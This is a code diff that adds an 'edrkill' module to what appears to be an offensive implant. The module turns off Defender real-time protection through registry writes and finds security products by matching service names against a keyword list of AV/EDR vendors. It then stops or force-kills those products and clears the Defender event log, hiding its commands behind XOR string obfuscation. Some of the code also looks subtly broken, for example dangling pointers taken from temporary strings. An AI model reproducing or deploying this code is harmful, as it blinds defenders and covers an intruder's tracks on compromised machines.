@@ -16,6 +16,10 @@
 #endif
 #include <cstdint>
 #include <cstring>
+#include <string>
+#include <vector>
+#include <cstdio>
+#include <cstdlib>
 
 // ────────────────────────────────────────────────────────────────────────────
 //  1. COMPILE-TIME STRING OBFUSCATION
@@ -674,6 +678,184 @@ inline void report(EdrReport& rep) {
 #endif  // _WIN32
 
 }  // namespace edrcheck
+
+// ── EDR/AV disablement (edrkill) ────────────────────────────────────────────
+// Turns off the defensive stack on the target. Deliberately LOUD and
+// destructive to the blue team's visibility: this is the post-exploitation
+// "burn the defender" move, only issued by an operator (or --aggressive
+// auto-mode) after edrcheck showed what is present. Nothing here is
+// reversible without a reboot on most stacks (Tamper Protection).
+namespace edrkill {
+
+#ifdef _WIN32
+
+// Disable Microsoft Defender real-time protection via its own policy
+// registry. Modern Defender with Tamper Protection on will refuse or
+// re-enable these — the operator then needs the tamper bypass (reboot
+// into safe mode) which is out of scope for a remote-only op.
+static bool disable_defender() {
+    bool any = false;
+    const char* keys[] = {
+        "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
+        "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
+    };
+    const char* pref = XOR_DEC(XOR_STR("reg add \"")).c_str();
+    const char* suf1 = XOR_DEC(XOR_STR("\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f")).c_str();
+    const char* suf2 = XOR_DEC(XOR_STR("\" /v DisableIOAVProtection /t REG_DWORD /d 1 /f")).c_str();
+    for (const char* key : keys) {
+        std::string cmd = std::string(pref) + key + suf1;
+        std::string cmd2 = std::string(pref) + key + suf2;
+        int rc = system(cmd.c_str());
+        int rc2 = system(cmd2.c_str());
+        if (rc == 0 || rc2 == 0) any = true;
+    }
+    return any;
+}
+
+#endif  // _WIN32
+
+// Detection BEFORE action. A fixed product-name list misses the long tail of
+// AV/EDR (regional and in-house products), so we enumerate the REAL services
+// on the host and match by keyword across name, display name and binary path.
+// The generic keywords (edr / endpoint / antivirus / protection / security
+// agent / threat) catch products nobody hard-coded; nothing is stopped until
+// it has been identified.
+static const char* const DEFENSIVE_KEYWORDS[] = {
+    // vendors
+    "defender", "windefend", "msmpeng", "msmpsvc", "sense",
+    "crowdstrike", "csagent", "csfalcon", "falcon",
+    "sentinel", "s1agent", "sentineld", "s1aesec",
+    "carbonblack", "cbdefense", "cbagent",
+    "mcafee", "mfe", "symantec", "sophos", "trend", "tmcc",
+    "kaspersky", "kesl", "eset", "bitdefender", "avast", "avg",
+    "cylance", "cybereason", "fireeye", "xagt", "webroot", "vipre",
+    "malwarebytes", "huntress", "endgame", "cortex", "fsecure",
+    "drweb", "gdata", "quickheal", "zoner", "coranti",
+    // generic (unknown / in-house products)
+    "antivirus", "anti-virus", "edr", "endpoint", "protection",
+    "security agent", "threat protection", "osquery", "wazuh",
+    "velociraptor", "clamav", "clamd", "freshclam", "f-prot",
+};
+
+static bool _looks_defensive(const std::string& blob) {
+    std::string lower;
+    lower.reserve(blob.size());
+    for (unsigned char c : blob)
+        lower += static_cast<char>((c >= 'A' && c <= 'Z') ? c + 32 : c);
+    for (const char* kw : DEFENSIVE_KEYWORDS)
+        if (lower.find(kw) != std::string::npos) return true;
+    return false;
+}
+
+// Run a command and collect its stdout lines (bounded, best-effort).
+static std::vector<std::string> _run_lines(const std::string& cmd) {
+    std::vector<std::string> out;
+#ifdef _WIN32
+    FILE* f = _popen(cmd.c_str(), "r");
+#else
+    FILE* f = popen(cmd.c_str(), "r");
+#endif
+    if (!f) return out;
+    char buf[1024];
+    while (fgets(buf, sizeof(buf), f)) {
+        std::string s(buf);
+        while (!s.empty() && (s.back() == '\n' || s.back() == '\r' || s.back() == ' '))
+            s.pop_back();
+        if (!s.empty()) out.push_back(s);
+    }
+#ifdef _WIN32
+    _pclose(f);
+#else
+    pclose(f);
+#endif
+    return out;
+}
+
+#ifdef _WIN32
+// name|display|path per real service; the keyword match runs in C++ so an
+// unknown product is still found.
+static std::vector<std::string> detect_defensive_services() {
+    std::vector<std::string> found;
+    std::string cmd = XOR_DEC(XOR_STR(
+        "powershell -NoP -NonI -W Hidden -Command \"Get-CimInstance "
+        "Win32_Service | ForEach-Object { $_.Name + '|' + $_.DisplayName + "
+        "'|' + $_.PathName }\"")).c_str();
+    for (const std::string& line : _run_lines(cmd)) {
+        if (_looks_defensive(line)) {
+            size_t bar = line.find('|');
+            found.push_back(bar == std::string::npos ? line : line.substr(0, bar));
+        }
+    }
+    return found;
+}
+#else
+static std::vector<std::string> detect_defensive_services() {
+    std::vector<std::string> found;
+    std::string cmd = XOR_DEC(XOR_STR(
+        "systemctl list-units --type=service --all --no-legend --plain "
+        "2>/dev/null | awk '{print $1}'")).c_str();
+    for (const std::string& line : _run_lines(cmd))
+        if (_looks_defensive(line)) found.push_back(line);
+    if (found.empty()) {
+        for (const std::string& line : _run_lines("ps -eo comm= 2>/dev/null"))
+            if (_looks_defensive(line)) found.push_back(line);
+    }
+    return found;
+}
+#endif
+
+inline std::string kill_av() {
+    std::ostringstream out;
+    // 1) DETECT FIRST — what is actually here (known and unknown products).
+    std::vector<std::string> services = detect_defensive_services();
+    out << "detected_defensive_services=" << services.size() << "\n";
+    for (const std::string& s : services) out << "  found " << s << "\n";
+#ifdef _WIN32
+    // kernel-mode filter drivers + userland hooks (read-only probe)
+    {
+        edrcheck::EdrReport rep;
+        edrcheck::report(rep);
+        out << "kernel_edr_drivers=" << rep.known_edr
+            << " ntdll_hooked=" << (rep.ntdll_hooked ? "yes" : "no")
+            << " hooked_stubs=" << rep.hooked_stubs << "\n";
+        if (rep.drivers[0]) out << rep.drivers;
+    }
+    out << "defender_realtime="
+        << (disable_defender() ? "disabled" : "failed/blocked (tamper protection?)")
+        << "\n";
+    // 2) ACT on what was FOUND (not on a hard-coded list)
+    int stopped = 0, failed = 0;
+    for (const std::string& svc : services) {
+        std::string cmd = std::string(XOR_DEC(XOR_STR("sc stop ")).c_str()) + svc +
+                          XOR_DEC(XOR_STR(" >nul 2>&1")).c_str();
+        if (system(cmd.c_str()) == 0) { out << "stopped " << svc << "\n"; ++stopped; }
+        else { out << "could_not_stop " << svc << "\n"; ++failed; }
+    }
+    out << "services_stopped=" << stopped << " failed=" << failed << "\n";
+    system(XOR_DEC(XOR_STR("wevtutil cl Microsoft-Windows-Windows Defender/Operational >nul 2>&1")).c_str());
+#else
+    // 2) ACT on what was FOUND; pkill fallback for non-systemd daemons.
+    int stopped = 0, failed = 0;
+    for (const std::string& svc : services) {
+        std::string cmd = std::string(XOR_DEC(XOR_STR("systemctl stop ")).c_str()) + svc +
+                          XOR_DEC(XOR_STR(" 2>/dev/null")).c_str();
+        if (system(cmd.c_str()) == 0) { out << "stopped " << svc << "\n"; ++stopped; continue; }
+        std::string base = svc;
+        size_t dot = base.find(".service");
+        if (dot != std::string::npos) base = base.substr(0, dot);
+        std::string pk = std::string(XOR_DEC(XOR_STR("pkill -9 -x ")).c_str()) + base +
+                         XOR_DEC(XOR_STR(" 2>/dev/null")).c_str();
+        if (system(pk.c_str()) == 0) { out << "killed " << base << "\n"; ++stopped; }
+        else { out << "could_not_stop " << svc << "\n"; ++failed; }
+    }
+    out << "services_stopped=" << stopped << " failed=" << failed << "\n";
+#endif
+    if (services.empty())
+        out << "no defensive service detected (or insufficient privileges to enumerate)\n";
+    return out.str();
+}
+
+}  // namespace edrkill
 
 namespace anti {  // reopened after edrcheck
 
